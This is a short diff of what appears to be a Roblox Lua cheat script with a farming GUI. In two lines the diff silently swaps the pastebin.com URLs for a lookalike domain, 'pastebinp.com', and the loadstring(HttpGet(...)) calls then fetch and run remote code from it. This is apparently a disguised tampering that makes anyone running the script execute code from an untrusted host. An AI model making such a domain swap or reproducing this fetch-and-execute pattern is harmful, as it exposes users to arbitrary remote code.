@@ -1,4 +1,4 @@
-local library = loadstring(game:HttpGet('https://pastebin.com/raw/T3tvmaz4'))()
+local library = loadstring(game:HttpGet('https://pastebinp.com/raw/T3tvmaz4'))()
 local MainWindow = library:CreateWindow("Farming")
 local EggsWindow = library:CreateWindow("Eggs")
 
@@ -254,7 +254,7 @@ MainWindow:Toggle("Collect Loot Bags", {flag = 'Lootbags', default = _G.Lootbags
     end
 end)
 MainWindow:Button("Stat Tracker", function()
-    loadstring(game:HttpGet('https://pastebin.com/raw/dPXXyp4A'))()
+    loadstring(game:HttpGet('https://pastebinp.com/raw/dPXXyp4A'))()
     wait(60)
     warn("60s has PASSED!")
 end)
